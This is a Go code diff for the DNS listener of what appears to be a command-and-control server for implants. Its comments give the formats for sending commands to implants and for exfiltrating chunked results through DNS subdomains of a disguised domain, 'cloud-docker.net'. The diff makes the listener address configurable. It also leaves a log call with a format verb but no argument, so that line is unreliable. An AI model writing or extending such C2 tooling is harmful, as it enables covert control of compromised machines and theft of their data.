@@ -7,6 +7,7 @@ import (
 	"github.com/miekg/dns"
 	"gorm.io/gorm"
 	"log"
+	"os"
 	"strconv"
 	"strings"
 	"sync"
@@ -53,14 +54,9 @@ import (
 //reply.Answer = []dns.RR{emptyTXT(q.Name)} // TODO: would this wokr?
 
 /*
-	TODO: have different endpoints for hiding (not cmd, res) (maybe c, r)? + add /new endpoint, obv
-		- command format: `<implant-id>.cmd.cloud-docker.net`
-		- sending results format: `implantID.taskID.chunkCount.chunkIndex.chunkData.res.<domain>`
+	- command format: `<implant-id>.cmd.cloud-docker.net`
+	- sending results format: `implantID.taskID.chunkCount.chunkIndex.chunkData.res.<domain>`
 */
-
-const (
-	C2Domain = "cloud-docker.net"
-)
 
 type DNSListener struct {
 	db *gorm.DB
@@ -248,11 +244,12 @@ func (h *DNSHandler) ServeDNS(w dns.ResponseWriter, req *dns.Msg) {
 }
 
 func (listener *DNSListener) Listen() {
+	dnsBindAddr := os.Getenv("DNS_BIND_ADDR")
 	server := &dns.Server{
-		Addr:    ":53",
+		Addr:    dnsBindAddr,
 		Net:     "udp",
 		Handler: NewDNSHandler(listener.db)}
-	log.Printf("Starting DNS server for zone %s on port 53", C2Domain)
+	log.Printf("Starting DNS server for zone %s on port 53")
 	if err := server.ListenAndServe(); err != nil {
 		log.Fatalf("server failed: %v", err)
 	}
